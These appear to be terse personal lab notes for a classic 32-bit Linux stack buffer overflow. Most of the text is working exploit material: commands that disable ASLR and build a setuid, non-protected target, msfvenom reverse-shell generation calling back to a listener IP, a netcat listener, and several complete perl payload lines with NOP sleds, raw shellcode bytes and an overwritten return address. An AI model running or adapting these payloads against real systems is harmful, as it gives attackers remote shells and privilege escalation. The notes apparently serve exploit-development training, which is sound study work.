Payload size: 68 bytes
Final size of c file: 311 bytes

192.168.0.147

nc -lvp 192.168.0.147 4444
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.147 LPORT=4444 -f c -b "\x00\x0D\x20\x09"

sudo sysctl -w kernel.randomize_va_space=0

sudo bash
gcc -m32 -no-pie -z execstack -fno-stack-protector -g -o stack stack.c
chmod 4755 stack
exit

gdb stack
list 1,40
b 14
b 17

set disassembly-flavor intel
disass main

// slightly over buffer size 20
run $(perl -e 'print "\x41"x24')

p &buffer

// stack memory, starting from first byte of buffer
x/48xw buffer

// return address
TODO: try any other address outside
0x080492d0

// Generated reverse shellcode
linux/x86/shell/reverse_tcp
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c
//e3f7db31
unsigned char buf[] = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd","\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02","\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3","\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f","\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
// NOP shell return
run $(perl -e 'print "\x90"x40,"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd","\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02","\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3","\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f","\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80","\xd0\x92\x04\x08"x40')

// return, shell NOP
run $(perl -e 'print "\xd0\x92\x04\x08"x40,"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd","\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02","\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3","\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f","\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80","\x90"x40')


//lab

/ return, NOP, shell, NOP


//new reverse shellcode without bad characters
Payload size: 95 bytes
Final size of c file: 425 bytes

run $(perl -e 'print "\xd0\x92\x04\x08"x16,"\x90"x20,"\xda\xca\xba\xf3\x8e\x9f\x45\xd9\x74\x24\xf4\x5f\x31\xc9","\xb1\x12\x83\xc7\x04\x31\x57\x13\x03\xa4\x9d\x7d\xb0\x7b","\x79\x76\xd8\x28\x3e\x2a\x75\xcc\x49\x2d\x39\xb6\x84\x2e","\xa9\x6f\xa7\x10\x03\x0f\x8e\x17\x62\x67\xd1\x40\x94\xe4","\xb9\x92\x95\x1b\x66\x1a\x74\xab\xf0\x4c\x26\x98\x4f\x6f","\x41\xff\x7d\xf0\x03\x97\x13\xde\xd0\x0f\x84\x0f\x38\xad","\x3d\xd9\xa5\x63\xed\x50\xc8\x33\x1a\xae\x8b","\x90"x20')

